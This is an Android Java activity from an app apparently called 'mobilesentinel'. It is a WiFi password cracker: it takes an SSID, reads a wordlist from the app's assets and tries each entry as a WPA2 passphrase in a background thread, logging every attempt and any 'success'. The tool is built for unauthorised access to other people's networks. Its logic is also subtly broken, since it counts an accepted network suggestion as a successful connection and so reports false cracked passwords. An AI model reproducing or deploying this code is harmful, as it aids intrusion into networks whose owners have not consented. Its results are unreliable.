package com.example.mobilesentinel;

import android.content.Context;
import android.content.Intent;
import android.net.wifi.WifiNetworkSuggestion;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.wifi.WifiManager;
import android.net.wifi.WifiInfo;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.widget.Button;
import android.widget.TextView;
import android.widget.ScrollView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

public class WifiDetailsActivity extends AppCompatActivity {

    private TextView wifiNameTextView, securityTypeTextView, networkModeTextView, terminalOutput;
    private Button startWifiCrackerButton;
    private ScrollView scrollView;
    private WifiManager wifiManager;
    private Handler handler;
    private String wifiName;
    private boolean isCracking;
    private String foundPassword = null;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.wifi_details_activity);

        // Initialize UI components
        wifiNameTextView = findViewById(R.id.wifiName);
        securityTypeTextView = findViewById(R.id.securityType);
        networkModeTextView = findViewById(R.id.networkMode);
        terminalOutput = findViewById(R.id.terminalOutput);
        startWifiCrackerButton = findViewById(R.id.startWifiCrackerButton);
        scrollView = findViewById(R.id.scrollView);

        // Initialize WifiManager
        wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        handler = new Handler(Looper.getMainLooper());

        // Get WiFi data from Intent
        wifiName = getIntent().getStringExtra("WIFI_NAME");
        String capabilities = getIntent().getStringExtra("CAPABILITIES");

        // Display WiFi information
        displayWifiInfo(wifiName, capabilities);

        // Register network callback to detect connections
        registerNetworkCallback();

        // Start cracking process
        startWifiCrackerButton.setOnClickListener(view -> {
            if (!isCracking) {
                isCracking = true;
                startWiFiCrackingProcess();
            } else {
                Toast.makeText(this, "Already cracking!", Toast.LENGTH_SHORT).show();
            }
        });
    }

    private void displayWifiInfo(String wifiName, String capabilities) {
        wifiNameTextView.setText(wifiName != null && !wifiName.isEmpty() ? wifiName : "WiFi Name Unavailable");

        if (capabilities != null) {
            if (capabilities.contains("WPA2")) {
                securityTypeTextView.setText("WPA2 (Secure)");
            } else if (capabilities.contains("WPA")) {
                securityTypeTextView.setText("WPA (Secure)");
            } else if (capabilities.contains("WEP")) {
                securityTypeTextView.setText("WEP (Less Secure)");
            } else {
                securityTypeTextView.setText("Open Network (No Security)");
            }

            if (capabilities.contains("ESS")) {
                networkModeTextView.setText("ESS (Extended Service Set)");
            } else {
                networkModeTextView.setText("Other Network Mode");
            }
        }
    }

    private void startWiFiCrackingProcess() {
        if (wifiName == null || wifiName.isEmpty()) {
            Toast.makeText(this, "WiFi name is missing. Unable to start cracking process.", Toast.LENGTH_SHORT).show();
            return;
        }

        // Read wordlist from assets
        List<String> wordlist = readWordlistFromAssets();
        if (wordlist == null || wordlist.isEmpty()) {
            updateTerminalOutput("Error: Wordlist is empty or could not be read.\n");
            return;
        }

        updateTerminalOutput("Starting WiFi cracking for: " + wifiName + "\n");

        // Start cracking in background thread
        new Thread(() -> {
            for (String password : wordlist) {
                if (foundPassword != null) {
                    break; // Stop if password was found
                }

                final String currentPassword = password;
                handler.post(() -> updateTerminalOutput("Trying password: " + currentPassword + "\n"));

                boolean isConnected = tryConnectToWifi(wifiName, currentPassword);
                if (isConnected) {
                    foundPassword = currentPassword;
                    handler.post(() -> {
                        updateTerminalOutput("✅ Success! Connected to WiFi with password: " + currentPassword + "\n");
                        Toast.makeText(WifiDetailsActivity.this, "Connected to WiFi!", Toast.LENGTH_SHORT).show();
                    });
                    return;
                }
            }

            if (foundPassword == null) {
                handler.post(() -> updateTerminalOutput("❌ Failed to crack the password for network: " + wifiName + "\n"));
            }
        }).start();
    }

    private List<String> readWordlistFromAssets() {
        List<String> wordlist = new ArrayList<>();
        try {
            InputStream inputStream = getAssets().open("wordlist.txt");
            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
            String line;

            while ((line = reader.readLine()) != null) {
                wordlist.add(line.trim());
            }

            reader.close();
        } catch (IOException e) {
            updateTerminalOutput("Error reading wordlist: " + e.getMessage() + "\n");
            e.printStackTrace();
        }
        return wordlist;
    }

    private boolean tryConnectToWifi(String ssid, String password) {
        WifiNetworkSuggestion suggestion =
                new WifiNetworkSuggestion.Builder()
                        .setSsid(ssid)
                        .setWpa2Passphrase(password)
                        .setIsAppInteractionRequired(true) // Ensures user is prompted
                        .build();

        List<WifiNetworkSuggestion> suggestions = new ArrayList<>();
        suggestions.add(suggestion);

        int status = wifiManager.addNetworkSuggestions(suggestions);
        return status == WifiManager.STATUS_NETWORK_SUGGESTIONS_SUCCESS;
    }

    private void registerNetworkCallback() {
        ConnectivityManager connectivityManager =
                (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);

        connectivityManager.registerDefaultNetworkCallback(new ConnectivityManager.NetworkCallback() {
            @Override
            public void onAvailable(Network network) {
                WifiInfo wifiInfo = wifiManager.getConnectionInfo();
                String connectedSSID = wifiInfo.getSSID().replace("\"", "");

                if (connectedSSID.equals(wifiName) && foundPassword == null) {
                    foundPassword = "Unknown (Detected connection)";
                    handler.post(() -> updateTerminalOutput("✅ Connected to " + connectedSSID + "! Password unknown.\n"));
                }
            }

            @Override
            public void onLost(Network network) {
                handler.post(() -> updateTerminalOutput("⚠️ Disconnected from WiFi.\n"));
            }
        });
    }

    private void updateTerminalOutput(String message) {
        terminalOutput.append(message);
        scrollView.post(() -> scrollView.fullScroll(ScrollView.FOCUS_DOWN));
    }
}